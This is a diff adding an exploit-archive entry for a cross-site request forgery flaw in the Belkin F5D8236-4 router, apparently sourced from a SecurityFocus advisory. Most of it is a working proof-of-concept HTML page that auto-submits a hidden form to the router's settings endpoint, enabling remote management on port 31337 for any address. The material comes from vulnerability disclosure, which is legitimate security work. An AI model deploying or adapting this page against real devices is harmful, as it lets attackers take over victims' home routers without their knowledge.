@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/59476/info
+
+Belkin F5D8236-4 Router is prone to a cross-site request-forgery vulnerability.
+
+Attackers can exploit this issue to perform certain administrative actions and gain unauthorized access to the affected device. 
+
+<html> <head> <title>Belkin F5D8236-4 v2 CSRF - Enable Remote MGMT.</title> <!-- Use JavaScript debugging to bypass authentication --> <!--*Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators --> </head> <body> <form name="belkin" action="http://X.X.X.X/cgi-bin/system_setting.exe" method="post"/> <input type="hidden" name="remote_mgmt_enabled" value="1"/> <input type="hidden" name="remote_mgmt_port" value="31337"/> <input type="hidden" name="allow_remote_ip" value="0"/> </form> <script> function BeLkIn() {document.belkin.submit();}; window.setTimeout(BeLkIn, 0000); </script> <body> </html> 
